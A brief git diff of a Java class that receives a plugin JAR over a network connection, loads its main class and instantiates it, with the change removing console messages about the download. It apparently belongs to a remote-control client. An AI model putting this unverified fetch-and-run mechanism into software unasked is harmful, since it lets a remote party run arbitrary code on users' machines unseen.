@@ -22,11 +22,7 @@ public class Packet101TransferPlugin extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		System.out.print("Downloading plugin ");
-
 		String name = Connection.readLine();		
-		
-		System.out.println(name);
 		
 		File file = File.createTempFile(name, ".jar");
 		
@@ -48,11 +44,12 @@ public class Packet101TransferPlugin extends AbstractIncomingPacket {
 			Logger.log("Failed loading main class from plugin.txt, trying meta-inf");
 			mainClass = JarUtils.getMainClass(new JarFile(file));
 		}
-
-		Class<?> clazz = Class.forName(mainClass, true, cl);
-		clazz.newInstance();
 		
 		Plugin p = new Plugin();
+
+		Class<?> clazz = Class.forName(mainClass, true, cl);
+		p.instance = clazz.newInstance();
+		
 		Plugin.addMethods(p, clazz);
 		
 		Plugin.list.add(p);
